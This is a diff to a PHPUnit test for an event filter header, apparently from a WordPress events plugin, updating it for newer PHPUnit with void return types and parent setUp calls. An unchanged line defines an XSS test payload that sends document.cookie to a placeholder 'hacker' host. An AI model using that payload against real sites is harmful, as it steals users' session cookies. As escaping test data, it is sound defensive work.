@@ -32,8 +32,9 @@ class EventFilterHeaderTest extends TestCase
     private $xss = '"><SCRIPT>var+img=new+Image();img.src="http://hacker/"%20+%20document.cookie;</SCRIPT>';
 
 
-    public static function setUpBeforeClass()
+    public static function setUpBeforeClass(): void
     {
+        parent::setUpBeforeClass();
         require_once EE_ADMIN . 'EE_Admin_Page.core.php';
         if (! defined('EVENTS_ADMIN_URL')) {
             define('EVENTS_ADMIN_URL', admin_url('admin.php?page=espresso_events'));
@@ -50,8 +51,9 @@ class EventFilterHeaderTest extends TestCase
      * @throws ReflectionException
      * @since 4.10.2.p
      */
-    public function setUp()
+    public function setUp(): void
     {
+        parent::setUp();
         $this->setUpEvent();
     }
 
@@ -153,7 +155,7 @@ class EventFilterHeaderTest extends TestCase
      */
     public function testGetHeaderText()
     {
-        foreach ($this->testDataGenerator() as list($get_params, $expected)) {
+        foreach ($this->testDataGenerator() as [$get_params, $expected]) {
             $this->assertInstanceOf('EE_Event', $this->event);
             $event_filter_header = $this->getEventFilterHeader($get_params);
             $header_text = $event_filter_header->getHeaderText();
